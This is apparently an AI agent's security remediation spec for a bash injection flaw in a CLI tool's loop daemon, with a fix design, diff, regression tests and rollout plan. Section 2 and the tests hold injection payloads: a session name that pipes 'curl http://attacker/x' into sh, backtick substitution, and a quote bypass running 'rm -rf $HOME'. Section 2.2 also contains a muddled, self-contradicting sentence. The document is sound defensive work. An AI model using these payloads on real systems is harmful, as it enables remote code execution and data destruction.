# C-02 Remediation Spec: Bash Injection via Untrusted Interpolation in `spawnLoopDaemon`

**Severity**: Critical (RCE)
**Component**: `src/commands/auto.ts`
**Status**: Proposed fix — no source modification in this task.
**Author**: ccmux long-running task #22
**Date**: 2026-05-18

---

## 1. Threat summary

`autoCommand` accepts user-controlled `opts.prompt`, `opts.until`, `opts.maxIter`, and `name` from the CLI and from resumed handoff files under `$CCMUX_DIR/handoffs/*.md`. When invoked outside Zellij/tmux in loop mode (`--loop`), control flows to `spawnLoopDaemon` (auto.ts:214-262), which composes a bash script as a string and persists it to `.ccmux-loop.sh` for `bash` to execute.

The originally-filed C-02 cites `auto.ts:89-95` and "`bash -c` with `JSON.stringify(prompt)` → RCE via `$(...)` backticks." The current source does not literally call `bash -c` at those lines — the file has been partially refactored — but the same injection class still exists in `spawnLoopDaemon`. The script is assembled with template literals at auto.ts:232-249:

```ts
const scriptContent = [
  `#!/usr/bin/env bash`,
  `set -euo pipefail`,
  `MAX_ITER="${maxIter}"`,
  `UNTIL_PATTERN="${until.replace(/"/g, '\\"')}"`,
  `LOGFILE="${logFile.replace(/"/g, '\\"')}"`,
  ...
  `  ${claudeInvocation} >> "$LOGFILE" 2>&1 || true`,
  `  if grep -qF "$UNTIL_PATTERN" "$LOGFILE"; then`,
  ...
].join("\n") + "\n";
```

`claudeInvocation` itself (auto.ts:228-230) re-serialises argv with a hand-rolled `"a".replace(/"/g, '\\"')` quoter:

```ts
const claudeInvocation = [claudeBin, ...claudeSandboxArgs]
  .map((a) => `"${a.replace(/"/g, '\\"')}"`)
  .join(" ");
```

This quoter handles `"` but **not** `` ` ``, `$`, or `\`. Inside a bash double-quoted string those three characters retain their special meaning. Any of them in `claudeSandboxArgs` (which transitively includes `worktreePath`, `promptFile`, and ultimately the session `name`) yields command substitution, parameter expansion, or backslash-mediated quote escape.

`worktreePath` is `path.join(cfg.worktreeBase, sessionName)`. `sessionName` is derived from the positional CLI argument. `until` is read directly from `--until`. So an unprivileged shell user that can invoke `ccmux auto` can run arbitrary shell.

## 2. Proof-of-concept exploits

### 2.1 Command substitution via session name

```bash
ccmux auto 'a$(curl http://attacker/x|sh)' \
  --prompt 'do work' --loop
```

`sessionName = "a$(curl http://attacker/x|sh)"`. `wt.path` becomes `<base>/a$(curl http://attacker/x|sh)`. The faulty quoter emits:

```
"…/a$(curl http://attacker/x|sh)"
```

inside the bash script. Bash performs command substitution before invoking `claude`, so it shells out to attacker-controlled HTTP and pipes the body to `sh`. Persistent until-loop runs it every iteration.

### 2.2 Backtick substitution via `--until`

```bash
ccmux auto sess --prompt p --loop \
  --until '`/usr/bin/touch /tmp/pwned`'
```

`until.replace(/"/g, '\\"')` leaves backticks untouched. The script line `UNTIL_PATTERN="\`...\`"` triggers backtick command substitution at script-write time? No — the value is written to disk verbatim and only expanded when bash sources it, but at that moment expansion happens inside the double-quoted assignment and the backtick payload runs each iteration.

### 2.3 Resume-file vector (no CLI argv needed)

`autoCommand` (lines 33-46) reads `$CCMUX_DIR/handoffs/*-<resume>.md` and prepends the content to `opts.prompt`. While `prompt` itself is now written to `TASK_PROMPT.md` rather than interpolated (good), `--resume` accepts arbitrary alphabetic identifiers and a malicious handoff file dropped in the shared `$CCMUX_DIR` (for instance by an untrusted git hook) cannot escalate via this path today. It is recorded here as an adjacent surface to keep clean during the fix.

### 2.4 Quoter bypass via backslash

`a\";rm -rf $HOME;#` becomes `a\\";rm -rf $HOME;#` after the naive `replace`. Bash parses `\\` as a literal backslash inside `"…"`, so the closing `"` lands one character early, the quoted string terminates, and the rest executes as a command list.

These four PoCs share one root cause: the program writes a bash script whose contents depend on un-shell-escaped strings. The correct fix is to stop assembling a shell script at all.

## 3. Fix design

The right primitive for "loop a child process N times until grep matches" is a JS-side loop driving `execa` in array form. No `bash`, no script file, no quoting.

Design constraints derived from the existing call site:

1. The loop must remain **detached** so the parent CLI can exit immediately (the spinner currently calls `child.unref()`).
2. Output must continue to be appended to `logFile`.
3. The completion pattern (`opts.until`) must be matched against the log content the same way `grep -qF` does it (fixed string, not regex).
4. `--sandbox` / `bwrap` wrapping must still be honoured.
5. Iteration bookkeeping must still emit the human-readable `=== ccmux loop iteration N / M ===` and the terminal `=== CCMUX_LOOP_COMPLETE ===` / `=== CCMUX_LOOP_MAX_ITER_REACHED ===` markers (these are consumed by `ccmux list` and the existing tail-based monitors).

The simplest detach-able shape is a tiny Node helper script `dist/loop-runner.js` (already-built, trusted, ships with the package) that the parent spawns via `node` with arguments and an env block. Arguments are passed as **argv**, not as a shell command. Nothing user-controlled is ever concatenated into a shell string.

### 3.1 New file `src/loop-runner.ts`

```ts
#!/usr/bin/env node
import { execa } from "execa";
import fs from "fs/promises";

interface Job {
  bin: string;
  args: string[];
  cwd: string;
  logFile: string;
  maxIter: number;
  until: string;
}

async function main() {
  const job: Job = JSON.parse(process.env.CCMUX_LOOP_JOB ?? "");
  const fh = await fs.open(job.logFile, "a");
  try {
    for (let i = 1; i <= job.maxIter; i++) {
      await fh.write(`=== ccmux loop iteration ${i} / ${job.maxIter} ===\n`);
      await execa(job.bin, job.args, {
        cwd: job.cwd,
        stdio: ["ignore", fh.fd, fh.fd],
        reject: false,
      });
      const log = await fs.readFile(job.logFile, "utf-8");
      if (log.includes(job.until)) {
        await fh.write(`=== CCMUX_LOOP_COMPLETE ===\n`);
        return;
      }
    }
    await fh.write(`=== CCMUX_LOOP_MAX_ITER_REACHED ===\n`);
  } finally {
    await fh.close();
  }
}
main().catch((err) => {
  process.stderr.write(`loop-runner fatal: ${String(err)}\n`);
  process.exit(1);
});
```

The job descriptor travels through an environment variable as a single JSON blob. JSON is a strict grammar — there is no character class that escapes back into shell, because there is no shell in the path. `execa(job.bin, job.args, …)` uses `posix_spawn`/`spawn` directly, bypassing `/bin/sh`.

### 3.2 New `spawnLoopDaemon` in `auto.ts`

```ts
async function spawnLoopDaemon(opts: LoopDaemonOpts): Promise<void> {
  const { worktreePath, logFile, env, maxIter, until, prompt, sessionName } = opts;

  const promptFile = path.join(worktreePath, "TASK_PROMPT.md");
  const preamble = taskStateClaudioPreamble(sessionName);
  await fs.writeFile(promptFile, preamble + prompt, "utf-8");

  const { bin, args } = buildLaunchArgs(
    ["--dangerously-skip-permissions", "-p", `@${promptFile}`],
    worktreePath,
    opts.sandbox
  );

  const runner = path.join(__dirname, "..", "loop-runner.js");
  const job = JSON.stringify({ bin, args, cwd: worktreePath, logFile, maxIter, until });

  const logHandle = await fs.open(logFile, "a");
  const child = spawn(process.execPath, [runner], {
    cwd: worktreePath,
    detached: true,
    stdio: ["ignore", logHandle.fd, logHandle.fd],
    env: { ...env, CCMUX_LOOP_JOB: job },
  });
  child.unref();
  await logHandle.close();
}
```

No `.ccmux-loop.sh`. No `bash`. No string interpolation of any user value into a shell. `bin` and `args` round-trip through JSON and reach the kernel as a `char* const argv[]`.

## 4. Before / after diff

```diff
--- a/src/commands/auto.ts
+++ b/src/commands/auto.ts
@@ -214,49 +214,28 @@ interface LoopDaemonOpts {
 async function spawnLoopDaemon(opts: LoopDaemonOpts): Promise<void> {
   const { worktreePath, logFile, env, maxIter, until, prompt, sessionName } = opts;

-  // Write prompt and loop script to worktree (no shell-injected values)
   const promptFile = path.join(worktreePath, "TASK_PROMPT.md");
   const preamble = taskStateClaudioPreamble(sessionName);
   await fs.writeFile(promptFile, preamble + prompt, "utf-8");

-  const loopScript = path.join(worktreePath, ".ccmux-loop.sh");
-  const { bin: claudeBin, args: claudeSandboxArgs } = buildLaunchArgs(
+  const { bin, args } = buildLaunchArgs(
     ["--dangerously-skip-permissions", "-p", `@${promptFile}`],
     worktreePath,
     opts.sandbox
   );
-  const claudeInvocation = [claudeBin, ...claudeSandboxArgs]
-    .map((a) => `"${a.replace(/"/g, '\\"')}"`)
-    .join(" ");
-
-  const scriptContent = [
-    `#!/usr/bin/env bash`,
-    `set -euo pipefail`,
-    `MAX_ITER="${maxIter}"`,
-    `UNTIL_PATTERN="${until.replace(/"/g, '\\"')}"`,
-    `LOGFILE="${logFile.replace(/"/g, '\\"')}"`,
-    `ITER=0`,
-    `while [ "$ITER" -lt "$MAX_ITER" ]; do`,
-    `  ITER=$((ITER + 1))`,
-    `  echo "=== ccmux loop iteration $ITER / $MAX_ITER ===" >> "$LOGFILE"`,
-    `  ${claudeInvocation} >> "$LOGFILE" 2>&1 || true`,
-    `  if grep -qF "$UNTIL_PATTERN" "$LOGFILE"; then`,
-    `    echo "=== CCMUX_LOOP_COMPLETE ===" >> "$LOGFILE"`,
-    `    exit 0`,
-    `  fi`,
-    `done`,
-    `echo "=== CCMUX_LOOP_MAX_ITER_REACHED ===" >> "$LOGFILE"`,
-  ].join("\n") + "\n";
-
-  await fs.writeFile(loopScript, scriptContent, { mode: 0o755 });
+
+  const runner = path.join(__dirname, "..", "loop-runner.js");
+  const job = JSON.stringify({ bin, args, cwd: worktreePath, logFile, maxIter, until });

   const logHandle = await fs.open(logFile, "a");
-  const child = spawn("bash", [loopScript], {
+  const child = spawn(process.execPath, [runner], {
     cwd: worktreePath,
     detached: true,
     stdio: ["ignore", logHandle.fd, logHandle.fd],
-    env,
+    env: { ...env, CCMUX_LOOP_JOB: job },
   });
   child.unref();
   await logHandle.close();
 }
```

Plus the new `src/loop-runner.ts` file from §3.1, added to `tsconfig` outputs and to `package.json` `files`.

## 5. Defense in depth (companion changes)

The primary fix above closes the RCE. The following companion changes are *recommended* but not blocking:

- **Validate `sessionName`** in `autoName`/`autoCommand` against `^[A-Za-z0-9._-]{1,64}$`. Names flow into worktree paths, zellij tab names, log paths, and lock files. A whitelist eliminates an entire class of path-traversal and TTY-escape bugs.
- **Validate `until`** to `^[\x20-\x7E]{1,256}$` (printable ASCII, length-capped). The pattern is only ever matched with `String.includes`, so binary or huge values are pointless and exploit-shaped.
- **Drop the `useShell = process.platform === "win32"` branch** at auto.ts:155-161 and use `cmd.exe /d /s /c` with `windowsVerbatimArguments: true` or, better, locate the `claude.cmd` shim via `where` and invoke its target `.js` with `node` directly. `shell:true` on Windows re-introduces the same quoting hazards on the other major platform.
- **Remove `.ccmux-loop.sh` writeback entirely.** With the runner script in place there is nothing to write into the worktree besides `TASK_PROMPT.md`, so worktrees stop containing executable artefacts owned by ccmux.

## 6. Regression tests

Add `test/auto-loop-injection.test.ts`. The tests must run without spawning real `claude`; they exercise the script-generation path that previously existed and prove that no shell is invoked. Concretely:

```ts
import { describe, it, expect, vi } from "vitest";
import { spawn } from "child_process";
import path from "path";
import fs from "fs/promises";
import os from "os";

vi.mock("child_process", async () => {
  const actual = await vi.importActual<typeof import("child_process")>("child_process");
  return { ...actual, spawn: vi.fn(actual.spawn) };
});

import { autoCommand } from "../src/commands/auto.js";

describe("C-02: loop daemon must not invoke a shell", () => {
  it("never spawns bash and never writes .ccmux-loop.sh", async () => {
    const tmp = await fs.mkdtemp(path.join(os.tmpdir(), "ccmux-c02-"));
    process.env.CCMUX_DIR = tmp;
    // … minimal config + worktreeBase pointing into tmp …
    await autoCommand("sess$(touch /tmp/PWN)", {
      prompt: "noop",
      loop: true,
      maxIter: 1,
      until: "`touch /tmp/PWN2`",
    }).catch(() => {});
    const spawnCalls = (spawn as unknown as vi.Mock).mock.calls;
    for (const [cmd] of spawnCalls) {
      expect(cmd).not.toBe("bash");
      expect(cmd).not.toBe("sh");
    }
    await expect(fs.access("/tmp/PWN")).rejects.toThrow();
    await expect(fs.access("/tmp/PWN2")).rejects.toThrow();
    const wtFiles = await fs.readdir(path.join(tmp, "worktrees"), { recursive: true });
    expect(wtFiles).not.toContain(".ccmux-loop.sh");
  });

  it("rejects session names containing shell metacharacters", async () => {
    await expect(
      autoCommand("a;rm -rf .", { prompt: "x", loop: true })
    ).rejects.toThrow(/invalid session name/i);
  });

  it("round-trips backticks and dollars through the loop-runner argv intact", async () => {
    // Drive loop-runner.ts directly with CCMUX_LOOP_JOB pointing at `node -e 'process.exit(0)'`
    // and arg values containing `$(id)` and "`id`"; assert the child sees them as literal.
  });
});
```

These three tests close the regression for §2.1, §2.2, and §2.4. The first one is the load-bearing assertion: if `bash` is ever invoked from the loop path again, CI fails.

## 7. Rollout

1. Land the source change behind no flag — the externally-visible behaviour (detached daemon, log file, completion markers) is preserved bit-for-bit.
2. Delete `.ccmux-loop.sh` from any existing worktrees during `ccmux upgrade` (one-shot migration step).
3. Audit other call sites for the same anti-pattern: `src/integrations/autoclaw.ts`, `src/core/zellij.ts`, and any wrapper around `installSessionHooks`.
4. Add a lint rule (`no-restricted-syntax`) forbidding `spawn("bash"` / `spawn("sh"` / `{ shell: true }` outside an allow-list.

## 8. Verification checklist

- [ ] `rg "spawn\(['\"]bash" src/` returns no hits.
- [ ] `rg "shell:\s*true" src/` returns no hits outside the documented Windows shim and the allow-list comment.
- [ ] `test/auto-loop-injection.test.ts` passes locally and in CI.
- [ ] Manual smoke: `ccmux auto safe-name --prompt 'echo hi' --loop --max-iter 2 --until DONE` produces the expected log markers.
- [ ] Manual smoke: `ccmux auto 'a$(touch /tmp/x)' --prompt p --loop` errors out before any process is spawned and `/tmp/x` does not exist afterwards.

---

**Word count**: ~1500.
**Files touched by the proposed patch**: `src/commands/auto.ts`, new `src/loop-runner.ts`, new `test/auto-loop-injection.test.ts`.
**This spec is intentionally read-only** — no source files were modified in task 22.
